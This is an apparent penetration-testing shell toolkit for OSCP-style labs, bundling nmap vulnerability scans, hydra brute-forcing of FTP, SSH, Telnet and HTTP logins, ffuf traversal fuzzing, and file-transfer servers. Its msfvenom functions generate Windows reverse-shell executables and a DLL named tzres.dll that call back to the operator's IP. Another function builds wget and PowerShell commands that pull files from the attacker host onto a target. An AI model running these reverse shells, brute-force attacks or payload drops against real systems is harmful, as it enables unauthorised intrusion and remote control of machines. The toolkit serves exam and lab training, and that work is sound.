#!/bin/bash

source $HOME/oscp-swiss/script/utils.sh
source $HOME/oscp-swiss/script/alias.sh

load_settings
load_private_scripts


function swiss() {   
    local swiss_path="$HOME/oscp-swiss/script/oscp-swiss.sh"
    local alias_path="$HOME/oscp-swiss/script/alias.sh"

    # Use grep with a regex to extract function names
    logger info "[i] Functions:"
    grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$swiss_path" | \
        sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column

    logger info "\n[i] Aliases:"
    # Extract and display all alias names
    grep -E '^\s*alias\s+' "$swiss_path" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
    grep -E '^\s*alias\s+' "$alias_path" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column

    logger info "\n[i] Variables:"
    # Extract and display all variable names
    grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$swiss_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
    grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$alias_path" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column

    # /private
    local script_dir="$HOME/oscp-swiss/private"
    if [ -d "$script_dir" ]; then
        for script in "$script_dir"/*.sh; do
        if [ -f "$script" ]; then

            logger warn "\n[i] Function under $script:"
            grep -E '^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{' "$script" | \
                sed -E 's/^\s*function\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(\)\s*\{/\1/' | sort | column
            logger warn "[i] Aliases under $script:"
            grep -E '^\s*alias\s+' "$script" | sed -E 's/^\s*alias\s+([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
            logger warn "[i] Variables under $script:"
            grep -E '^\s*[a-zA-Z_][a-zA-Z0-9_]*=' "$script" | sed -E 's/^\s*([a-zA-Z_][a-zA-Z0-9_]*)=.*/\1/' | sort | column
        fi
        done
    else
        echo "Directory $script_dir not found."
    fi
}

function swiss_nmap() {
    # Default mode - fast
    local mode="fast"
    local ip=""

    _help() {
        logger info "Usage: nmap_default --ip <IP> [--mode <mode>]"
        logger info "Modes: fast (default), tcp, udp, udp-all, stealth"
    }

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
        -i|--ip)
            shift
            ip="$1"
            ;;
        -m|--mode)
            shift
            mode="$1"
            ;;
        *)
            _help
            return 1
            ;;
        esac
        shift
    done

    if [[ -z "$ip" ]]; then
        _help
        return 1
    fi

    local saved_file_path="$(pwd)/nmap/$ip"
    logger info "[i] Creating directory $saved_file_path ..."
    mkdir -p $saved_file_path

    case "$mode" in
        fast)
            mkdir -p $saved_file_path/fast
            logger info "[i] Start quick check. Saved to $saved_file_path/quick-tcp"
            nmap -v --top-ports 2000 $ip -oN $saved_file_path/fast/tcp

            local fast_ports=$(grep -oP '^\d+\/\w+' $saved_file_path/fast/tcp | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            logger info "[i] Checking service on ports - $fast_ports. Saved to $saved_file_path/fast/tcp-svc"
            nmap -p$fast_ports -sVC $ip -oN $saved_file_path/fast/tcp-svc

            logger info "[i] Checking vuln script - $fast_ports. Saved to $saved_file_path/fast/tcp-vuln"
            nmap -p$fast_ports --script vuln $ip -oN $saved_file_path/fast/tcp-vuln

            logger info "[i] Check UDP top 200 ports. Saved to $saved_file_path/fast/udp-top-200"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/fast/udp-top-200
            ;;
        tcp)
            mkdir -p $saved_file_path/tcp
            logger info "[i] Start tcp check. Saved to $saved_file_path/tcp/check-1"
            nmap -p0-65535 -v $ip -oN $saved_file_path/tcp/check-1

            local ports=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-1 | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
            logger info "[i] Checking service on ports - $ports. Saved to $saved_file_path/tcp/svc"
            nmap -p$ports -sVC $ip -oN $saved_file_path/tcp/svc

            logger info "[i] Checking vuln script - $ports. Saved to $saved_file_path/tcp/vuln"
            nmap -p$ports --script vuln $ip -oN $saved_file_path/tcp/vuln
            
            logger info "[i] Start general check (second round). Saved to $saved_file_path/tcp/check-2"
            nmap -p0-65535 $ip -oN $saved_file_path/tcp/check-2
            
            local services_first=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-1 | awk '{print $1}' | sort -u)
        
            # Extract services from the second round
            local services_second=$(grep -oP '^\d+\/\w+' $saved_file_path/tcp/check-2 | awk '{print $1}' | sort -u)
            
            logger warn "[i] Services found in the second round but not in the first round:"
            comm -13 <(echo "$services_first") <(echo "$services_second")
            ;;
        udp)
            mkdir -p $saved_file_path/udp
            logger info "[i] Start udp check (top 200 ports). Saved to $saved_file_path/udp/udp_fast"
            sudo nmap --top-ports 200 -sU -F -v $ip -oN $saved_file_path/udp/fast
            ;;
        udp-all)
            mkdir -p $saved_file_path/udp
            logger info "[i] Start udp check (all). Saved to $saved_file_path/udp/udp_all"
            sudo nmap -sU -F -v $ip -oN $saved_file_path/udp/udp_all
            ;;
        stealth)
            mkdir -p $saved_file_path/stealth
            logger info "[i] Start stealth nmap. Saved to $saved_file_path/stealth/stealth"
            sudo nmap -sS -p0-65535 -oN $saved_file_path/stealth/stealth
            ;;
        *)
            echo "Error: Invalid mode '$mode'. Valid modes are: fast, tcp, udp, udp-all."
            return 1
            ;;
    esac
}

function swiss_svc() {
    local service=""

    _help() {
        logger info "Usage: swiss_svc --service <service name>]"
        logger info "service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
    }

    while [[ "$#" -gt 0 ]]; do
        case "$1" in
        -s|--service)
            shift
            service="$1"
            ;;
        *)
            _help
            return 1
            ;;
        esac
        shift
    done

    if [[ -z "$service" ]]; then
        _help
        return 1
    fi

    case "$service" in
        docker)
            logger info "[i] start docker"
            logger warn "[i] to stop, use the following commands: "
            logger warn "[i] sudo systemctl stop docker"
            logger warn "[i] sudo systemctl stop docker.socket"
            sudo service docker restart
            ;;
        ftp)
            logger info "[i] start ftp server on host"
            logger info "[i] usage:"
            logger info "[i] (1) run ftp"
            i
            logger info "[i] (2) run open <ip> 2121"
            logger info "[i] (2-2) Default Interface ($DEFAULT_NETWORK_INTERFACE) IP: $(get_default_network_interface_ip)"
            logger info "[i] (3) use username anonymous"
            logger info "[i] (4) binary # use binary mode"
            logger info "[i] (5) put <file-you-want-to-download>"
            python -m pyftpdlib -w
            ;;
        http)
            logger info "[i] start http server"
            logger warn "[i] python3 -m http.server 80"
            i
            python3 -m http.server 80
            ;;
        smb)
            logger info "[i] start smb server"
            logger info "[i] impacket-smbserver smb . -smb2support"
            i
            impacket-smbserver smb . -smb2support
            ;;
        ssh)
            logger info "[i] start ssh server"
            logger warn "[i] sudo systemctl stop ssh; kill -9 $(pgrep ssh); sudo systemctl start ssh"
            i
            # kill all ssh process
            sudo systemctl stop ssh
            kill -9 $(pgrep ssh)
            sudo systemctl start ssh
            ;;
        bloodhound)
            # ref: https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose
            logger info "[i] start BloodHound CE (v2.4.1) ..."
            logger info "[i] start port check on 8080"

            # Check if port 8080 is open using lsof
            if lsof -i :8080 > /dev/null; then
                logger error "Port 8080 is open. Exited"
                exit 1
            fi

            logger info "[i] cloning docker-compose files from /opt/BloodHound/examples/docker-compose"
            cp /opt/BloodHound/examples/docker-compose/* $(pwd)

            logger info "[i] BloodHound CE starts on port 8080 (default), username: admin, password check on the terminal logs"
            logger info "[i] preferred password: @Bloodhound123"

            sudo docker-compose up
            ;;
        wsgi)
            logger info "[i] start wsgidav under the directory: $(pwd)"
            logger info "[i] usage: svc_wsgi <port>"
            i
            $HOME/.local/bin/wsgidav --host=0.0.0.0 --port=${@} --auth=anonymous --root .
            ;;
        *)
            logger error "Error: Invalid service '$service'. Valid service: docker; ftp; http; smb; ssh; bloodhound; wsgi"
            return 1
            ;;
    esac
}

function swiss_ship() {
    local type="linux"
    local filepath
    local autoHostHttp=1

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type)
                type="$2"
                shift 2
                ;;
            -a|--auto-host-http)
                autoHostHttp="$2"
                shift 2
                ;;
            *)
                filepath="$1"
                shift
                ;;
        esac
    done

    if [[ -z "$filepath" ]]; then
        log error "[e] Filepath is required."
        log info "[i] Usage: swiss_ship [-t|--type linux|windows] [-a|--auto-host-http] <filepath>"
        return 1
    fi

    if [[ ! -f "$filepath" ]]; then
        echo error"[e] File '$filepath' does not exist."
        return 1
    fi

    local filename=$(basename "$filepath")

    cp "$filepath" "./$filename" && log info "[i] File '$filename' copied to current directory."


    autoHost() {
        if [[ "$autoHostHttp" -eq 1 ]]; then
            swiss_svc -s http
        else
            echo warning "[W] Remember to host the web server on your own"
        fi
    }

    if [[ "$type" == "linux" ]]; then
        local cmd="wget $(get_default_network_interface_ip)/$filename"
        echo info "[i] Linux type selected. wget command ready."
        echo info "[i] $cmd"
        echo -n $cmd | xclip -selection clipboard

        autoHost

    elif [[ "$type" == "windows" ]]; then
        local cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(get_default_network_interface_ip)/$filename' -OutFile \$env:TEMP\\$filename\""
        echo info "[i] Windows type selected. wget command ready."
        echo info "[i] $cmd"

        echo -n $cmd | xclip -selection clipboard

        autoHost
    else
        log error "Unknown type '$type'. Set to 'linux'."
    fi
}

function swiss_windows_nc() {
    sudo rlwrap nc -lvnp $1
}

function swiss_windows_rev() {
    logger info "[i] generating windows rev exe using msfvenom"

    local ip=$(get_default_network_interface_ip)
    local port=""
    local arch=""

    while [[ $# -gt 0 ]]; do
        case $1 in
            -i|--ip)
                ip="$2"
                shift 2
                ;;
            -p|--port)
                port="$2"
                shift 2
                ;;
            -a|--arch)
                arch="$2"
                shift 2
                ;;
            *)
                logger error "[i] Invalid option: $1"
                logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
                return 1
                ;;
        esac
    done

    # Check if the required arguments (port and arch) are provided
    if [[ -z "$port" || -z "$arch" ]]; then
        logger error "[i] Port and architecture must be specified"
        logger info "[i] usage: gen_win_rev_exe <-p PORT> <-a x86|x64|dll> [-i IP]"
        return 1
    fi

    # Generate reverse shell based on architecture
    case $arch in
        x86)
            msfvenom -p windows/shell/reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x86.exe
            ;;
        x64)
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f exe -o reverse-x64.exe
            ;;
        dll)
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=$port -f dll -o tzres.dll
            ;;
        *)
            logger error "[i] Invalid architecture: $arch. Only x86, x64, and dll are supported."
            return 1
            ;;
    esac
}

# default args for ffuf
function ffuf_default() {
    if [ $# -eq 0 ]; then
        logger info "[i] Usage: ffuf_default [URL/FUZZ] (options)"
    else
        logger warn "[i] Recursive with depth = 2 by default"
        local url="$1"

        if [[ "$url" =~ ^https?:// ]]; then
            # If the URL includes a protocol, extract the part after '://'
            local domain=$(echo "$url" | awk -F/ '{print $3}')
        else
            # If the URL does not include a protocol, treat the first part as the domain/IP
            local domain=$(echo "$url" | awk -F/ '{print $1}')
        fi
        
        local domain_dir="$(pwd)/ffuf/$domain"

        logger info "[i] Creating directory $domain_dir ..."
        mkdir -p "$domain_dir"
        ffuf -w $wordlist_ffuf_default -recursion -recursion-depth 2 -u ${@} | tee "$domain_dir/wordlist-ffuf-default"
    fi
}

# default args for ffuf
function ffuf_traversal_default() {
    if [ $# -eq 0 ]
    then
        logger info "[i] Usage: ffuf_traversal_default [URL/FUZZ] (options)"
    else
        [ ! -d "$(pwd)/ffuf" ] && logger info "[i] Creating directory $(pwd)/ffuf ..." && mkdir -p ffuf
        logger info "[i] using wordlist: /wordlists/IntruderPayloads/FuzzLists/traversal-short.txt"
        ffuf -w /usr/share/wordlists/IntruderPayloads/FuzzLists/traversal-short.txt -u ${@} > ./ffuf/traversal-short | tee

        logger info "[i] using wordlist: /wordlists/IntruderPayloads/FuzzLists/traversal.txt"
        ffuf -w /usr/share/wordlists/IntruderPayloads/FuzzLists/traversal.txt -u ${@} > ./ffuf/traversal | tee

        logger info "[i] using wordlist: /custom-traversal.txt"
        ffuf -w /usr/share/wordlists/custom-traversal.txt -u ${@} > ./ffuf/custom-traversal | tee
    fi
}

# default args for gobuster dns
function gobuster_dns_default() {
    if [ $# -eq 0 ]
    then
        logger info "[i] Usage: gobuster_dns_default [domain_name] (options)"
    else
        [ ! -d "$(pwd)/gobuster" ] && logger info "[i] Creating directory $(pwd)/gobuster ..." && mkdir -p gobuster
        logger info "[i] using wordlist: /amass/subdomains-top1mil-110000.txt"
        gobuster dns -w $wordlist_subdomain_amass_big -t 20 -o gobuster/dns_subdomain_big -d ${@}

        logger info "[i] using wordlist: //dirbuster/directory-list-2.3-medium.txt"
        gobuster dns -w $wordlist_subdomain_dirb -t 20 -o gobuster/dns_subdomain_dirb -d ${@}
    fi
}

# default args for gobuster vhost
function gobuster_vhost_default() {
    if [ $# -eq 0 ]
    then
        logger info "[i] Usage: gobuster_vhost_default [ip] [domain] (options)"
    else
        [ ! -d "$(pwd)/gobuster" ] && logger info "[i] Creating directory $(pwd)/gobuster ..." && mkdir -p gobuster
        logger info "[i] using wordlist: /amass/subdomains-top1mil-110000.txt"

        local ip="$1"
        local domain="$2"

        gobuster vhost -k -u $ip --domain $domain --append-domain -r -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -o gobuster/vhost_default -t 64
    fi
}

# default for hydra
function hydra_default() {
    local IP=$1
    local PORTS=$2
    
    # Check if username.txt exists
    if [ ! -f "username.txt" ]; then
        logger error "[E] username.txt not found in the current directory."
        return 1
    fi
    
    # Iterate over the provided ports
    for PORT in $(echo $PORTS | tr "," "\n"); do
        # Determine the service based on the port and run the appropriate hydra command
        case $PORT in
            21)
                logger info "[I] Running hydra for FTP on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ftp://$IP
                ;;
            22)
                logger info "[I] Running hydra for SSH on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT ssh://$IP
                ;;
            23)
                logger info "[I] Running hydra for Telnet on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT telnet://$IP
                ;;
            80)
                logger info "[I] Running hydra for HTTP on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT http://$IP
                ;;
            443)
                echo "[I] Running hydra for HTTPS on port $PORT..."
                hydra -L username.txt -e nsr -s $PORT https://$IP
                ;;
            *)
                echo "Port $PORT not recognized or not supported for brute-forcing by this script."
                ;;
        esac
    done
}

# copy the current directory name to the clipboard
function cp_dir() {
    
    local current_dir=$(basename "$PWD")
    local dash_count=$(echo "$input" | tr -cd '-' | wc -c)

    # Check if the number of dashes is greater than 2
    if [ "$dash_count" -gt 2 ]; then
            # Copy the current directory name to the clipboard
            echo -n "$current_dir" | xclip -selection clipboard
            logger info "[i] Custom Format Invalid. Format: <name>-<IP> or <IP>-<name>."
            logger info "[i] Directory name '$current_dir' copied to clipboard."
    else
        local val1=$(echo "$current_dir" | awk -F- '{print $1}')
        local val2=$(echo "$current_dir" | awk -F- '{print $2}')

        logger info "[i] identified custom format: $val1-$val2"

        local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

        if [[ $val1 =~ $ip_regex ]]; then
            echo -n "$val1" | xclip -selection clipboard
            logger info "[i] IP '$val1' copied to clipboard."
        elif [[ $val2 =~ $ip_regex ]]; then
            echo -n "$val2" | xclip -selection clipboard
            logger info "[i] IP '$val2' copied to clipboard."
        else
            # Copy the current directory name to the clipboard
            echo -n "$current_dir" | xclip -selection clipboard
            echo "Directory name '$current_dir' copied to clipboard."
        fi
    fi
}

# Function to copy the IPv4 address of a specified network interface to the clipboard
function cp_ip() {
    logger info "[i] Usage: cp_ip <interface>"

    local interface="$1"

    # Check if an interface was provided as an argument
    if [ -z "$1" ]; then
        logger warn "[i] interface not found. Use default interface <$DEFAULT_NETWORK_INTERFACE>"
        interface="$DEFAULT_NETWORK_INTERFACE"
    fi

    # Retrieve the IPv4 address of the specified interface
    local ip_address
    ip_address=$(ip -4 addr show "$interface" | grep -oP '(?<=inet\s)\d+(\.\d+){3}')

    # Check if an IP address was found
    if [ -z "$ip_address" ]; then
        logger error "No IPv4 address found for interface $interface."
        return 1
    fi

    # Copy the IP address to the clipboard using xclip
    echo -n "$ip_address" | xclip -selection clipboard

    # Provide feedback to the user
    logger info "IPv4 address $ip_address of interface $interface copied to clipboard."
}

# get all urls from a web page
function gen_pagelink() {
    logger info "[i] start extracting all urls from $1"
    logger info "[i] original files will be stored at $PWD/links.txt"
    logger info "[i] unique links (remove duplicated) will be stored at $PWD/links-uniq.txt"
    lynx -dump $1 | awk '/http/{print $2}' > links.txt
    sort -u links.txt > links-uniq.txt
    cat ./links-uniq.txt
}

# get keydords
function gen_keywords() {
    logger info "[i] usage: gen_keywords $url"
    cewl -d 2 -m 4 -w cewl-wordlist.txt $1
}

# set a path as workspace (cross-session)
function set_workspace() {
    s workspace $PWD
}

# go to the path defined as workspace (cross-session)
function go_workspace() {
    cd $(g workspace)
}

function set_target() {
    s target $1
    target=$1
}

function get_target() {
    # Use the 'g' function to get the target value from the config file
    local target=$(g target)

    # Check if the 'g' function returned '-1', indicating the target is not set
    if [[ "$target" == "-1" ]]; then
        logger error "Target not found."
    elif [[ "$target" == "-2" ]]; then
        logger error "[!] Config file not found!"
    else
        # Copy the target to the clipboard
        echo -n "$target" | xclip -selection clipboard
        echo "Target '$target' copied to clipboard."
    fi
}

# copy a linpeas-like script to speed up the enumeration
function cp_target_script() {
    logger info "[i] Usage: cp_target_script"
    local shell_path="$HOME/oscp-swiss/script/target-enum-script.sh"
    local new_file_path="/tmp/$(generate_random_filename).sh"
    _cat $shell_path > $new_file_path
    echo "" >> $new_file_path
    echo "host='$(get_default_network_interface_ip)'" >> $new_file_path

    _cat $new_file_path | xclip -selection clipboard
    rm $new_file_path
}

# tcpdump from an ip address
function listen_target() {
    logger info "[i] tcpdump to listen anything from an ip address\n"
    logger info "[i] Usage: listen <ip> [-i]"

    local ip=$1

    # Check if the interface is provided, otherwise use default 'tun0'
    if [ "$2" == "-i" ] && [ -n "$3" ]; then
        interface=$3
    else
        interface=$DEFAULT_NETWORK_INTERFACE
    fi

    # Run tcpdump with the specified interface and IP address
    sudo tcpdump -i "$interface" dst "$ip" or src "$ip"
}

# generate workspace for pen test
function init_workspace() {
    logger info "[i] Initializing workspace ..."
    logger info "[i] Enter workspace name: \c"
    read -r workspace_name
    logger info "[i] Enter IP address: \c"
    read -r ip_address

    local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"
    if [[ ! $ip_address =~ $ip_regex ]]; then
        logger error "[!] Invalid IP address format."
        return 1
    fi

    local dir_name="${workspace_name}-${ip_address}"

    mkdir -p "$dir_name"
    cd "$dir_name" || { logger error "[!] Failed to enter directory '$dir_name'"; return 1; }

    touch username.txt
    touch password.txt

    set_workspace
    set_target "$ip_address"

    cp_dir
}

# set a path as workspace (cross-session)
function set_workspace() {
    s workspace $PWD
}

# go to the path defined as workspace (cross-session)
function go_workspace() {
    cd $(g workspace)
}

function merge() {
    local file1="$1"
    local file2="$2"
    local output_file="./merged.txt"

    # Check if both files exist
    if [[ ! -f "$file1" || ! -f "$file2" ]]; then
        logger error "[i] Both files must exist."
        return 1
    fi

    # Check if output file already exists
    if [[ -f "$output_file" ]]; then
        logger error "[] $output_file already exists."
        return 1
    fi

    # Combine both files, sort them, remove duplicates, and create merged.txt
    cat "$file1" "$file2" | sort | uniq > "$output_file"
    logger info "[i] $output_file created successfully."
}

# get all files from ftp
function get_ftp_all_files() {
    # Assigning parameters to variables
    local USERNAME=$1
    local PASSWORD=$2
    local IP=$3

    # Check if all parameters are provided
    if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ] || [ -z "$IP" ]; then
        echo "Usage: get_ftp_all <username> <password> <ipaddress>"
        return 1
    fi

    # Run wget command with the provided parameters
    wget -r --no-passive --no-parent ftp://$USERNAME:$PASSWORD@$IP
}

# copy the current directory name to the clipboard
function cp_dir() {
    
    local current_dir=$(basename "$PWD")
    local dash_count=$(echo "$input" | tr -cd '-' | wc -c)

    # Check if the number of dashes is greater than 2
    if [ "$dash_count" -gt 2 ]; then
            # Copy the current directory name to the clipboard
            echo -n "$current_dir" | xclip -selection clipboard
            logger info "[i] Custom Format Invalid. Format: <name>-<IP> or <IP>-<name>."
            logger info "[i] Directory name '$current_dir' copied to clipboard."
    else
        local val1=$(echo "$current_dir" | awk -F- '{print $1}')
        local val2=$(echo "$current_dir" | awk -F- '{print $2}')

        logger info "[i] identified custom format: $val1-$val2"

        local ip_regex="^([0-9]{1,3}\.){3}[0-9]{1,3}$"

        if [[ $val1 =~ $ip_regex ]]; then
            echo -n "$val1" | xclip -selection clipboard
            logger info "[i] IP '$val1' copied to clipboard."
        elif [[ $val2 =~ $ip_regex ]]; then
            echo -n "$val2" | xclip -selection clipboard
            logger info "[i] IP '$val2' copied to clipboard."
        else
            # Copy the current directory name to the clipboard
            echo -n "$current_dir" | xclip -selection clipboard
            echo "Directory name '$current_dir' copied to clipboard."
        fi
    fi
}